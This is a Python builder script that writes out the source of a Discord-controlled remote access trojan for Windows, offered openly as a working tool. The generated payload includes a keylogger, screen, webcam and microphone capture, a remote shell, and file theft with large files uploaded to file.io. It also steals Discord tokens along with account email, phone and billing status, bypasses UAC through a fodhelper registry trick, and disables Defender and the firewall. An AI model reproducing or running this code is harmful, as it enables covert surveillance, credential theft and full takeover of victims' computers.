from colorama import Fore
import time, sys, os, ctypes, shutil

def discordrat():
    def spinner():
        l = ['|', '/', '-', '\\']
        for i in l+l:
            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Creating File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)
        print('\n')
        for i in l+l+l+l:
            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Writing File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)

    os.system('cls' if os.name == 'nt' else 'clear')
    rattitle()
    print(f"""{y}[{w}+{y}]{w} Enter the name you want to give to the final file: """)
    global filename
    fileName = str(input(f"""{y}[{b}#{y}]{w} File name: """))
    print(f"""\n\n{y}[{w}+{y}]{w} Enter the token of the bot you will use to execute the RAT commands: """)
    global tokenbot
    tokenbot = str(input(f"""{y}[{b}#{y}]{w} Bot token: """))
    print('\n')
    spinner()

    try:
        with open(f"temp/{fileName}.py", "w") as file:
            file.write("""import winreg
import ctypes
import sys
import os
import ssl
import random
import threading
import time
import cv2
import subprocess
import discord
from comtypes import CLSCTX_ALL
from discord.ext import commands
from ctypes import *
import asyncio
import discord
from discord import utils
token = '~~TOKENHERE~~'
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
ssl._create_default_https_context = ssl._create_unverified_context
async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await client.change_presence(status=discord.Status.online, activity=window_displayer)
        time.sleep(1)
def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()
@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    total = []
    global number
    number = 0
    global channel_name
    channel_name = None
    for x in client.get_all_channels(): 
        total.append(x.name)
    for y in range(len(total)):
        if "session" in total[y]:
            import re
            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  
    if number == 0:
        channel_name = "session-1"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()}"
    if is_admin == True:
        await channel.send(f'{value1} | admin!')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)
def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)
        if message.content.startswith("!kill"):
            try:
                if message.content[6:] == "all":
                    for y in range(len(total)): 
                        if "session" in total[y]:
                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
                            await channel_to_delete.delete()
                        else:
                            pass
                else:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} killed.")
            except:
                await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
        if message.content == "!dumpkeylogger":
            import os
            temp = os.getenv("TEMP")
            file_keys = temp + r"\key_log.txt"
            file = discord.File(file_keys, filename="key_log.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.popen(f"del {file_keys}")
        if message.content == "!exit":
            import sys
            uncritproc()
            sys.exit()
        if message.content == "!windowstart":
            import threading
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")
        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)
        if message.content == "!screenshot":
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
            path = (os.getenv('TEMP')) + r"\monitor.png"
            file = discord.File((path), filename="monitor.png")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(path)
        if message.content == "!webcampic":
            import os
            import time
            import cv2
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            #time.sleep(0.1)
            return_value, image = camera.read()
            cv2.imwrite(temp + r"\\temp.png", image)
            del(camera)
            file = discord.File(temp + r"\\temp.png", filename="temp.png")
            await message.channel.send("[*] Command successfuly executed", file=file)
        if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            def get_all_hwnd(hwnd,mouse):
                def winEnumHandler(hwnd, ctx):
                    if win32gui.GetWindowText(hwnd) == "Error":
                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        return None
                    else:
                        pass
                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                    win32gui.EnumWindows(winEnumHandler,None)
            win32gui.EnumWindows(get_all_hwnd, 0)
        if message.content.startswith("!wallpaper"):
            import ctypes
            import os
            path = os.path.join(os.getenv('TEMP') + r"\\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            await message.channel.send("[*] Command successfuly executed")
        if message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send("[*] Command successfuly executed")
        if message.content.startswith("!shell"):
            global status
            import time
            status = None
            import subprocess
            import os
            instruction = message.content[7:]
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                    dele = "del" + temp + r"\output.txt"
                    os.popen(dele)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)
            else:
                await message.channel.send("[*] Command not recognized or no output was obtained")
                status = None
        if message.content.startswith("!download"):
            import subprocess
            import os
            filename=message.content[10:]
            check2 = os.stat(filename).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                await message.channel.send("download link: " + response)
                await message.channel.send("[*] Command successfuly executed")
            else:
                file = discord.File(message.content[10:], filename=message.content[10:])
                await message.channel.send("[*] Command successfuly executed", file=file)
        if message.content.startswith("!cd"):
            import os
            os.chdir(message.content[4:])
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!help":
            import os
            temp = (os.getenv('TEMP'))
            f5 = open(temp + r"\helpmenu.txt", 'a')
            f5.write(str(helpmenu))
            f5.close()
            temp = (os.getenv('TEMP'))
            file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.system(r"del %temp%\helpmenu.txt /f")
        if message.content.startswith("!write"):
            import pyautogui
            if message.content[7:] == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(message.content[7:])
        if message.content == "!clipboard":
            import ctypes
            import os
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + str(body))
        if message.content == "!sysinfo":
            import platform
            jak = str(platform.uname())
            intro = jak[12:]
            from requests import get
            ip = get('https://api.ipify.org').text
            pp = "IP Address = " + ip
            await message.channel.send("[*] Command successfuly executed : " + intro + pp)
        if message.content == "!geolocate":
            import urllib.request
            import json
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[*] Command successfuly executed : " + link)
        if message.content == "!admincheck":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Congrats you're admin")
            elif is_admin == False:
                await message.channel.send("[!] Sorry, you're not admin")
        if message.content == "!uacbypass":
            import winreg
            import ctypes
            import sys
            import os
            import time
            import inspect
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                await message.channel.send("Your already admin!")
            else:
                await message.channel.send("attempting to get admin!")
                if message.content == "!uacbypass":
                    uncritproc()
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = \""" powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force \"""
                    os.system(create_reg_path)
                    create_trigger_reg_key = \""" powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force \"""
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = \"""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python \""" + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\\'"' + \""" -Force\"""
                    os.system(create_payload_reg_key)
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                remove_reg = \""" powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force \"""
                os.system(remove_reg)
        if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            log_dir = temp
            logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                                level=logging.DEBUG, format='%%(asctime)s: %%(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfuly started")
        if message.content == "!stopkeylogger":
            import os
            test._running = False
            await message.channel.send("[*] Keylogger successfuly stopped")
        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]
            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            import threading
            global idle1
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send('User idle for %%.2f seconds.' % duration)
            import time
            time.sleep(1)
        if message.content.startswith("!blockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content == "!streamwebcam" :
            await message.channel.send("[*] Command successfuly executed")
            import os
            import time
            import cv2
            import threading
            import sys
            import pathlib
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            running = message.content
            file = temp + r"\hobo\hello.txt"
            if os.path.isfile(file):
                delelelee = "del " + file + r" /f"
                os.system(delelelee)
                os.system(r"RMDIR %temp%\hobo /s /q")
            while True:
                return_value, image = camera.read()
                cv2.imwrite(temp + r"\\temp.png", image)
                boom = discord.File(temp + r"\\temp.png", filename="temp.png")
                kool = await message.channel.send(file=boom)
                temp = (os.getenv('TEMP'))
                file = temp + r"\hobo\hello.txt"
                if os.path.isfile(file):
                    del camera
                    break
                else:
                    continue
        if message.content == "!stopwebcam":  
            import os
            os.system(r"mkdir %temp%\hobo")
            os.system(r"echo hello>%temp%\hobo\hello.txt")
            os.system(r"del %temp\\temp.png /F")
        if message.content == "!getdiscordinfo":
            import os
            if os.name != "nt":
                exit()
            from re import findall
            from json import loads, dumps
            from base64 import b64decode
            from subprocess import Popen, PIPE
            from urllib.request import Request, urlopen
            from threading import Thread
            from time import sleep
            from sys import argv
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = {
                "Discord": ROAMING + "\\\\Discord",
                "Discord Canary": ROAMING + "\\\\discordcanary",
                "Discord PTB": ROAMING + "\\\\discordptb",
                "Google Chrome": LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
                "Opera": ROAMING + "\\\\Opera Software\\Opera Stable",
                "Brave": LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
                "Yandex": LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\Default"
            }
            def getHeader(token=None, content_type="application/json"):
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
                }
                if token:
                    headers.update({"Authorization": token})
                return headers
            def getUserData(token):
                try:
                    return loads(
                        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
                except:
                    pass
            def getTokenz(path):
                path += "\\\\Local Storage\\\\leveldb"
                tokens = []
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                tokens.append(token)
                return tokens
            def whoTheFuckAmI():
                ip = "None"
                try:
                    ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
                except:
                    pass
                return ip
            def hWiD():
                p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
            def getFriends(token):
                try:
                    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                                headers=getHeader(token))).read().decode())
                except:
                    pass
            def getChat(token, uid):
                try:
                    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                                data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
                except:
                    pass
            def paymentMethods(token):
                try:
                    return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                                        headers=getHeader(token))).read().decode())) > 0)
                except:
                    pass
            def sendMessages(token, chat_id, form_data):
                try:
                    urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                                    "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                                    data=form_data.encode())).read().decode()
                except:
                    pass
            
            def main():
                cache_path = ROAMING + "\\\\.cache~$"
                prevent_spam = True
                self_spread = True
                embeds = []
                working = []
                checked = []
                already_cached_tokens = []
                working_ids = []
                ip = whoTheFuckAmI()
                pc_username = os.getenv("UserName")
                pc_name = os.getenv("COMPUTERNAME")
                user_path_name = os.getenv("userprofile").split("\\\\")[2]
                for platform, path in PATHS.items():
                    if not os.path.exists(path):
                        continue
                    for token in getTokenz(path):
                        if token in checked:
                            continue
                        checked.append(token)
                        uid = None
                        if not token.startswith("mfa."):
                            try:
                                uid = b64decode(token.split(".")[0].encode()).decode()
                            except:
                                pass
                            if not uid or uid in working_ids:
                                continue
                        user_data = getUserData(token)
                        if not user_data:
                            continue
                        working_ids.append(uid)
                        working.append(token)
                        username = user_data["username"] + "#" + str(user_data["discriminator"])
                        user_id = user_data["id"]
                        email = user_data.get("email")
                        phone = user_data.get("phone")
                        nitro = bool(user_data.get("premium_type"))
                        billing = bool(paymentMethods(token))
                        embed = f\"""
Email: {email}
Phone: {phone}
Nitro: {nitro}
Billing Info: {billing}
value: IP: {ip}
Username: {pc_username}
PC Name: {pc_name}
Token Location: {platform}     
Token : {token}                       
username: {username} ({user_id})
\"""
                        return str(embed)
            try:
                    embed = main()
                    await message.channel.send("[*] Command successfuly executed\\n"+str(embed))
            except Exception as e:
                    pass            
        if message.content == "!streamscreen" :
            await message.channel.send("[*] Command successfuly executed")
            import os
            from mss import mss
            temp = (os.getenv('TEMP'))
            hellos = temp + r"\hobos\hellos.txt"        
            if os.path.isfile(hellos):
                os.system(r"del %temp%\hobos\hellos.txt /f")
                os.system(r"RMDIR %temp%\hobos /s /q")      
            else:
                pass
            while True:
                with mss() as sct:
                    sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
                path = (os.getenv('TEMP')) + r"\monitor.png"
                file = discord.File((path), filename="monitor.png")
                await message.channel.send(file=file)
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\hobos\hellos.txt"
                if os.path.isfile(hellos):
                    break
                else:
                    continue
                    
        if message.content == "!stopscreen":  
            import os
            os.system(r"mkdir %temp%\hobos")
            os.system(r"echo hello>%temp%\hobos\hellos.txt")
            os.system(r"del %temp%\monitor.png /F")
            
        if message.content == "!shutdown":
            import os
            uncritproc()
            os.system("shutdown /p")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!restart":
            import os
            uncritproc()
            os.system("shutdown /r /t 00")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!logoff":
            import os
            uncritproc()
            os.system("shutdown /l /f")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!bluescreen":
            import ctypes
            import ctypes.wintypes
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        if message.content == "!currentdir":
            import subprocess as sp
            output = sp.getoutput('cd')
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("output is : " + output)
            
        if message.content == "!displaydir":
            import subprocess as sp
            import time
            import os
            import subprocess
            def shell():
                output = subprocess.run("dir", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output22.txt"):
                        os.system(r"del %temp%\output22.txt /f")
                    f1 = open(temp + r"\output22.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output22.txt", filename="output22.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)  
        if message.content == "!dateandtime":
            import subprocess as sp
            output = sp.getoutput(r'echo time = %time%% date = %%date%')
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("output is : " + output)
            
        if message.content == "!listprocess":
            import subprocess as sp
            import time
            import os
            import subprocess
            def shell():
                output = subprocess.run("tasklist", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output.txt"):
                        os.system(r"del %temp%\output.txt /f")
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)           
        if message.content.startswith("!prockill"):  
            import os
            proc = message.content[10:]
            kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f"
            import time
            import os
            import subprocess   
            os.system(kilproc)
            import subprocess
            time.sleep(2)
            process_name = proc
            call = 'TASKLIST', '/FI', 'imagename eq %%s' % process_name
            output = subprocess.check_output(call).decode()
            last_line = output.strip().split('\\r\\n')[-1]
            done = (last_line.lower().startswith(process_name.lower()))
            if done == False:
                await message.channel.send("[*] Command successfuly executed")
            elif done == True:
                await message.channel.send('[*] Command did not exucute properly') 
        if message.content.startswith("!recscreen"):
            import cv2
            import numpy as np
            import pyautogui
            reclenth = float(message.content[10:])
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                if input3 >= reclenth:
                    break
                else:
                    continue
            import os
            SCREEN_SIZE = (1920, 1080)
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            temp = (os.getenv('TEMP'))
            videeoo = temp + r"\output.avi"
            out = cv2.VideoWriter(videeoo, fourcc, 20.0, (SCREEN_SIZE))
            counter = 1
            while True:
                counter = counter + 1
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
                if counter >= input2:
                    break
            out.release()
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.avi"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.avi /f")
            else:
                file = discord.File(check, filename="output.avi")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.avi /f")
        if message.content.startswith("!reccam"):
            import cv2
            import numpy as np
            import pyautogui
            input1 = float(message.content[8:])
            import cv2
            import os
            temp = (os.getenv('TEMP'))
            vid_capture = cv2.VideoCapture(0)
            vid_cod = cv2.VideoWriter_fourcc(*'XVID')
            loco = temp + r"\output.mp4"
            output = cv2.VideoWriter(loco, vid_cod, 20.0, (640,480))
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                ret,frame = vid_capture.read()
                output.write(frame)
                if input3 >= input1:
                    break
                else:
                    continue
            vid_capture.release()
            output.release()
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.mp4"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.mp4 /f")
            else:
                file = discord.File(check, filename="output.mp4")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.mp4 /f")
        if message.content.startswith("!recaudio"):
            import cv2
            import numpy as np
            import pyautogui
            import os
            import sounddevice as sd
            from scipy.io.wavfile import write
            seconds = float(message.content[10:])
            temp = (os.getenv('TEMP'))
            fs = 44100
            laco = temp + r"\output.wav"
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(laco, fs, myrecording)
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.wav"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.wav /f")
            else:
                file = discord.File(check, filename="output.wav")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.wav /f")
        if message.content.startswith("!delete"):
            global statue
            import time
            import subprocess
            import os
            instruction = message.content[8:]
            instruction = "del " + '"' + instruction + '"' + " /F"
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            global statue
            statue = "ok"
            if statue:
                numb = len(result)
                if numb > 0:
                    await message.channel.send("[*] an error has occurred")
                else:
                    await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] Command not recognized or no output was obtained")
                statue = None
        if message.content == "!disableantivirus":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:            
                import subprocess
                instruction = \""" REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  \"""
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    return output
                result = str(shell().stdout.decode('CP437'))
                done = result.split()
                boom = done[2:]
                if boom <= ['17763']:
                    os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
                    await message.channel.send("[*] Command successfuly executed")
                elif boom >= ['18362']:
                    os.system(r\"""powershell Add-MpPreference -ExclusionPath "C:\\\\" \""")
                    await message.channel.send("[*] Command successfuly executed")
                else:
                    await message.channel.send("[*] An unknown error has occurred")     
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content == "!disablefirewall":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                os.system(r"NetSh Advfirewall set allprofiles state off")
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[*] This command requires admin privileges")
        if message.content.startswith("!audio"):
            import os
            temp = (os.getenv("TEMP"))
            temp = temp + r"\audiofile.wav"
            if os.path.isfile(temp):
                delelelee = "del " + temp + r" /f"
                os.system(delelelee)
            temp1 = (os.getenv("TEMP"))
            temp1 = temp1 + r"\sounds.vbs"
            if os.path.isfile(temp1):
                delelee = "del " + temp1 + r" /f"
                os.system(delelee)                
            await message.attachments[0].save(temp)
            temp2 = (os.getenv("TEMP"))
            f5 = open(temp2 + r"\sounds.vbs", 'a')
            result = \""" Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = \""" + '"' + temp + '"' \""": oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close \"""
            f5.write(result)
            f5.close()
            os.system(r"start %temp%\sounds.vbs")
            await message.channel.send("[*] Command successfuly executed")
        #if adding startup n stuff this needs to be edited to that
